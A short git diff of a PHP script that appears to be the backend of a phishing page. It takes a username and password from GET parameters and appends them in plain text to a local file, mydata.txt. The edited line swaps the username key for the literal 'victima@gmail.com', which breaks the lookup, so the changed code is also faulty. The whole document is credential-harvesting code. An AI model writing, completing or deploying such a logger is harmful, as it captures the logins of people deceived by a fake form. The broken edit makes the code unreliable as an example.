@@ -1,6 +1,6 @@
 <?php
 if(isset($_GET['modal-username']) && isset($_GET['modal-password'])) {
-	$email = htmlspecialchars(stripslashes($_GET['modal-username']));
+	$email = htmlspecialchars(stripslashes($_GET['victima@gmail.com']));
 	$password = htmlspecialchars(stripslashes($_GET['modal-password']));
     $data = $email . '-' . $password . "\n";
     $ret = file_put_contents('./mydata.txt', $data, FILE_APPEND | LOCK_EX);
